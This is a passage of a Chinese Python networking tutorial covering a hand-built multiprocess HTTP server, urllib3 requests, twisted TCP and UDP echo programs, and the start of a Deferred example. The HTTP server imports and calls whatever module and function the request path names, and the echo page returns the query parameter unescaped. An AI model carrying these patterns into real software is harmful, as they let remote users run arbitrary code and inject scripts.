        self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#启动监听</span>
    <span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">'''服务器开始提供服务'''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><span class="token comment">#持续提供服务</span>
            cli_socket<span class="token punctuation">,</span>iport<span class="token operator">=</span>self<span class="token punctuation">.</span>server_socket<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#接收客户端请求</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'新的客户端连接，客户端ip:%s,客户端端口:%s'</span><span class="token operator">%</span><span class="token punctuation">(</span>iport<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>iport<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#输出客户端信息</span>
            <span class="token comment">#将客户端都设置为一个独立的进程存在 都分别进行请求的回应</span>
            handle_cli_process<span class="token operator">=</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>self<span class="token punctuation">.</span>handle_response<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>cli_socket<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            handle_cli_process<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#进程启动</span>
    <span class="token keyword">def</span> <span class="token function">handle_response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>cli_socket<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token triple-quoted-string string">'''对每一个指定的客户端进行响应'''</span>
        request_headers<span class="token operator">=</span>cli_socket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment">#用户通过浏览器发送的请求本身就携带头信息</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>request_headers<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment">#使用正则提取请求头信息</span>
        <span class="token comment"># file_name=re.match(r'w+ +(/[^ ]*)',request_headers.decode().split('rn')[0]).group(1)</span>
        file_name<span class="token operator">=</span>request_headers<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> file_name<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#要访问的是一个动态页面</span>
            request_name<span class="token operator">=</span>file_name<span class="token punctuation">[</span>file_name<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#访问路径</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'访问路径:"'</span><span class="token punctuation">,</span>request_name<span class="token punctuation">)</span>
            param_value<span class="token operator">=</span><span class="token string">""</span><span class="token comment">#请求参数</span>
            <span class="token keyword">if</span> request_name<span class="token punctuation">.</span>__contains__<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#参数路径分隔符</span>
                request_param<span class="token operator">=</span>request_name<span class="token punctuation">[</span>request_name<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
                param_value<span class="token operator">=</span>request_param<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#获取参数名称</span>
                request_name<span class="token operator">=</span>request_name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span>request_name<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment">#获取模块名称</span>
            model_name<span class="token operator">=</span>request_name<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">#模块名称</span>
            method_name<span class="token operator">=</span>request_name<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment">#函数名称</span>
            model<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">(</span>model_name<span class="token punctuation">)</span><span class="token comment">#加载模块</span>
            method<span class="token operator">=</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>model<span class="token punctuation">,</span>method_name<span class="token punctuation">)</span>
            response_body<span class="token operator">=</span>method<span class="token punctuation">(</span>param_value<span class="token punctuation">)</span>
            response_start_line <span class="token operator">=</span> <span class="token string">'HTTP/2 200 OKrn'</span>
            response_headers <span class="token operator">=</span> <span class="token string">'Server PWS/2.0rn'</span>  <span class="token comment"># 可以添加更多的响应头信息</span>
            response <span class="token operator">=</span> response_start_line <span class="token operator">+</span> response_headers <span class="token operator">+</span> <span class="token string">'rn'</span> <span class="token operator">+</span> response_body  <span class="token comment"># 最终的响应内容</span>
            cli_socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>response<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        cli_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#HTTP不保留用户状态，所以每次处理后都断开连接，否则会造成性能开支，且这些开支是无意义的</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    http_server<span class="token operator">=</span>HttpServer<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token comment">#80为服务器的默认端口，可以不用输入，直接输入域名即可</span>
    http_server<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开启服务</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-python"><span class="token comment">#page包中echo.py文件</span>
<span class="token keyword">def</span> <span class="token function">service</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#响应的处理函数</span>
    <span class="token keyword">if</span> param<span class="token punctuation">:</span><span class="token comment">#如果此时的param有数据</span>
        <span class="token keyword">return</span> <span class="token string">'&lt;h1&gt;'</span><span class="token operator">+</span>param<span class="token operator">+</span><span class="token string">'&lt;/h1&gt;'</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'&lt;h1&gt;NO found&lt;/h1&gt;'</span>
<span class="token comment">#访问路径：http://localhost/page/echo/service?param=</span>
</code></pre> 
<h1>
<a id="11urllib3_531"></a>11.urllib3</h1> 
<p>urllib是Python中提供的一个url请求访问的模块，利用该模块可以实现浏览器的模拟访问，而urllib3是此模块的升级版，主要是为Python3服务的，两者功能类似，只不过有一些细微的差别</p> 
<pre><code class="prism language-python"><span class="token comment">#--------------urllib3--------------</span>
<span class="token keyword">import</span> urllib3
url<span class="token operator">=</span><span class="token string">'http://www.baidu.com'</span><span class="token comment">#页面的访问路径</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    request_headers<span class="token operator">=</span><span class="token punctuation">{<!-- --></span>
        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4676.0 Safari/537.36'</span>
    <span class="token punctuation">}</span>
    http<span class="token operator">=</span>urllib3<span class="token punctuation">.</span>PoolManager<span class="token punctuation">(</span>num_pools<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>request_headers<span class="token punctuation">)</span><span class="token comment">#获取urllib3进程管理对象</span>
    response<span class="token operator">=</span>http<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span>url<span class="token punctuation">)</span><span class="token comment">#发送get请求</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token comment">#响应头信息</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#响应文件</span>
    <span class="token keyword">pass</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<h1>
<a id="12twisted_550"></a>12.twisted模块认识</h1> 
<p>java中的IO：</p> 
<ul>
<li>传统BIO模型–同步阻塞IO</li>
<li>伪异步IO模型–以BIO为基础，通过线程方式维护所有IO线程，实现相对高效的线程开销及管理</li>
<li>NIO模型–一种同步非阻塞IO</li>
<li>
</li>
</ul> 
<p>twisted类似NIO，是Python之中提供的专门实现异步处理的IO概念，它的主要功能是提升服务端数据的处理能力<br> 难道使用多进程，多线程等并发技术不能良好的解决性能问题吗？<br> 要想理解twisted设计思想，那么首先就必须清楚传统服务器端程序开发中存在的问题？</p> 
<p>为了让服务端的程序更加高效的客户端请求处理，所以引入并发编程，将每一个客户端单独启动一个进程或线程，这样就可以实现服务器的并发响应</p> 
<p><img src="https://images2.imgbox.com/23/44/m73ct4ip_o.png" alt="在这里插入图片描述"><br> 对于此时的开发架构已经充分的发挥出了电脑硬件性能的作用，使用硬件提供的核心支持，进行并发编程实现，但需要清楚的是早期的电脑硬件是没有这样所谓的多核CPU概念的，早期的设计里面使用的单核CPU，需要非常细致的解决不同进程以及线程彼此间所谓的等待与唤醒机制(<strong>死锁问题</strong>)，虽然单进程性能不高，但是却可以有效的解决所谓的不同进程或线程之间可能产生的死锁问题。</p> 
<p>如果不使用并发编程的形式，那么就不会有并发编程之中的问题（资源切换，系统调度，同步与等待所带来的性能损耗）<br> 所有的传统服务端，如果采用的是阻塞的模式，那么就会持续发生等待的操作问题，而这种等待的问题是严重的损耗服务端性能的，即便服务端硬件在强大，损耗也挺严重。</p> 
<p>阻塞IO本质：使用水壶烧开水，在旁边盯着看，怕水开后，水壶烧坏<br> 非阻塞IO本质：不盯着水壶，对水壶进行定期的不断轮询，没开就继续干其他事，开了就结束烧水</p> 
<p>twisted是一个事件驱动的网络引擎，最大特点是提供有一个事件循环处理，当外部事件发生时使用回调机制来触发相应的处理操作，多个任务在一个线程中执行，，这种方式可以使程序尽可能的减少对于其他线程的依赖，也使得程序开发人员不在关注线程安全问题</p> 
<p>twsited中所有处理事件(注册，注销，运行，回调处理等)全部交由<strong>reactor</strong>进行统一管理，在整个程序运行过程中，reactor循环会以单线程的模式持续运行，当需要执行回调处理时reactor会暂停循环，当回调操作执行完毕后将继续采用循环的形式进行其他任务处理，由于这种操作是从平台行为中抽象出来的，这样就使得网络协议栈的任何位置很容易的进行事件响应<br> <img src="https://images2.imgbox.com/2c/81/vng3JMBO_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="13twistedTCP_576"></a>13.twisted开发TCP程序</h1> 
<p>使用twisted最大的特点是进行服务端程序的开发，这样的开发会为服务端的资源利用带来极大的便利<br> 使用twisted实现echo程序<br> 如果要实现echo服务端程序的开发，那么让服务端的处理类继承一个twisted.internet.protocol.Protocol 父类，随后就根据自己的需要来选择要复写的方法</p> 
<pre><code class="prism language-python"><span class="token comment">#-------twisted服务端程序----------</span>
<span class="token keyword">import</span> twisted <span class="token comment">#pip install Twisted</span>
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span><span class="token comment">#设置监听端口</span>
<span class="token keyword">class</span> <span class="token class-name">Server</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>Protocol<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#服务端一定要设置一个继承父类</span>
    <span class="token keyword">def</span> <span class="token function">connectionMade</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#客户端连接时触发</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'客户端地址:%s'</span><span class="token operator">%</span>self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>getPeer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>host<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">dataReceived</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#接收客户端数据</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务端接受到的数据%s'</span><span class="token operator">%</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#输出接收到的数据</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'echo %s'</span><span class="token operator">%</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#回应</span>
<span class="token keyword">class</span> <span class="token class-name">DefaultServerFactory</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>Factory<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#定义处理工厂类</span>
    protocol<span class="token operator">=</span>Server<span class="token comment">#注册回调操作</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>listenTCP<span class="token punctuation">(</span>SERVER_PORT<span class="token punctuation">,</span>DefaultServerFactory<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#服务监听</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务启动完毕，等待客户端连接。。。'</span><span class="token punctuation">)</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#事件轮询</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>处理流程：定义事件的处理回调操作程序–工厂中注册–Reactor依据工厂来获得相应的事件回调处理操作类</p> 
<pre><code class="prism language-python"><span class="token comment">#---------------twisted客户端----------</span>
<span class="token keyword">import</span> twisted
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor
SERVER_HOST<span class="token operator">=</span><span class="token string">'localhost'</span><span class="token comment">#服务主机</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span><span class="token comment">#连接端口</span>
<span class="token keyword">class</span> <span class="token class-name">Client</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>Protocol<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#定义用户端处理类</span>
    <span class="token keyword">def</span> <span class="token function">connectionMade</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器连接成功，可以进行数据交互，若要结束，则直接回车，，'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#建立连接后就进行数据的发送</span>
    <span class="token keyword">def</span> <span class="token function">dataReceived</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#接收服务端的数据</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务端 接收到数据：%s'</span><span class="token operator">%</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#输出接收到的数据</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#继续发送</span>
    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#数据发送 自定义的方法</span>
        input_data<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入要发送的数据：'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> input_data<span class="token punctuation">:</span><span class="token comment">#如果有数据</span>
            self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span>input_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment">#没有输入内容，表示操作的结束</span>
            self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>loseConnection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#关闭连接</span>
<span class="token keyword">class</span> <span class="token class-name">DefaultClientFactory</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>ClientFactory<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#客户端工厂</span>
    protocol<span class="token operator">=</span>Client<span class="token comment">#定义回调</span>
    clientConnectionLost<span class="token operator">=</span>clientConnectionFailed<span class="token operator">=</span><span class="token keyword">lambda</span> self<span class="token punctuation">,</span>connector<span class="token punctuation">,</span>reason<span class="token punctuation">:</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#停止循环</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>connectTCP<span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">,</span>DefaultClientFactory<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#连接主机服务</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#程序运行</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>通过程序执行结果可以发现，此处避免了非常繁琐的并发控制的操作，没有了多进程或多线程的操作控制部分，整个执行流程都是基于单线程的运行模式完成(Python中的多线程存在GIL全局锁问题，这就解决了此类问题)</p> 
<h1>
<a id="14twistedUDP_635"></a>14.使用twisted开发UDP程序</h1> 
<p>TCP是面向连接的可靠的网络服务，所以不管使用的是socket还是twisted都需要进行连接的操作控制，这样一定会造成不必要的性能开支，所以twisted内部也支持有UDP程序开发，因为UDP不需要保证可靠连接，所以只需要定义好用户的处理回调操作即可。</p> 
<pre><code class="prism language-python"><span class="token comment">#----------UDP twisted服务端-------</span>
<span class="token keyword">import</span> twisted
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">class</span> <span class="token class-name">EchoServer</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>DatagramProtocol<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#数据报协议</span>
    <span class="token keyword">def</span> <span class="token function">datagramReceived</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>datagram<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#接收数据处理</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务端 接收到消息，消息来源IP：%s,来源端口：%s'</span><span class="token operator">%</span> addr<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务端 接收到数据消息:%s'</span><span class="token operator">%</span>datagram<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        echo_data<span class="token operator">=</span><span class="token string">'echo %s'</span><span class="token operator">%</span>datagram<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#设置回应信息</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span>echo_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token comment">#将信息返回给指定客户端</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>listenUDP<span class="token punctuation">(</span>SERVER_PORT<span class="token punctuation">,</span>EchoServer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#服务监听</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器启动完成，等待客户端连接。。。'</span><span class="token punctuation">)</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#事件循环</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>使用UDP进行处理的时候不在需要使用那些连接的控制，同时也不在需要通过工厂才可以与Reactor进行衔接，从结构上更加的简单了</p> 
<pre><code class="prism language-python"><span class="token comment">#------------UDP twisted客户端操作---------</span>
<span class="token keyword">import</span> twisted
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol
SERVER_HOST<span class="token operator">=</span><span class="token string">'127.0.0.1'</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
CLIENT_PORT<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#客户端地址</span>
<span class="token keyword">class</span> <span class="token class-name">EchoClient</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>DatagramProtocol<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#UDP客户端1</span>
    <span class="token keyword">def</span> <span class="token function">startProtocol</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#连接的回调</span>
        self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">)</span><span class="token comment">#连接</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器连接成功，可以进行数据交互，如果要结束会话，直接回车'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#消息发送</span>
    <span class="token keyword">def</span> <span class="token function">datagramReceived</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>datagram<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#接收数据处理</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>datagram<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#下一次数据发送</span>
    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#数据发送 自定义方法</span>
        input_data<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入要发送的信息:'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> input_data<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span>input_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#停止轮询</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>listenUDP<span class="token punctuation">(</span>CLIENT_PORT<span class="token punctuation">,</span>EchoClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#服务监听</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#开启事件循环</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>所有网络程序进行开发的过程中实际上只有一个核心的目的：提升服务端的资源的可用性(发挥出最大的性能)，减少操作的延迟，但是，UDP当今的应用都是在即时消息通讯操作上，而对于TCP的开发操作依然是主流</p> 
<h1>
<a id="15Deferred_689"></a>15.Deferred</h1> 
<p>在网络开发之中，对于服务端性能提升可以使用twisted直接完成，但是在一些客户端与网络服务器端交互的过程之中，有可能下载需要下载一些比较庞大的文件内容(图片，视频等等)，按照传统的客户端的开发模型来讲，此时就需要持续进行下载，而对于当前的客户端也将进入到一个阻塞的开发状态，那么在这样的情况下为了解决客户端的阻塞问题，就提供了Deferred的概念<br> <img src="https://images2.imgbox.com/12/02/WZgSWjoS_o.png" alt="在这里插入图片描述"><br> 在twisted设计之中最大的特点就是持续的强调采用非阻塞的形式来完成，同时尽可能的减少并发操作，通过事件轮询的方式来提升程序的可用资源，基于事件轮询的机制设计出一套Deferred的模型<br> <img src="https://images2.imgbox.com/d5/72/Sdz82MOU_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token comment">#------------defered模拟--------</span>
<span class="token keyword">import</span> twisted
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>defer
<span class="token keyword">import</span> time
<span class="token keyword">class</span> <span class="token class-name">DeferHandle</span><span class="token punctuation">:</span><span class="token comment">#设置一个回调处理类</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>defer<span class="token operator">=</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>defer<span class="token punctuation">.</span>Deferred<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取defer对象</span>
    <span class="token keyword">def</span> <span class="token function">get_defer</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#让外部获得实例对象</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>defer
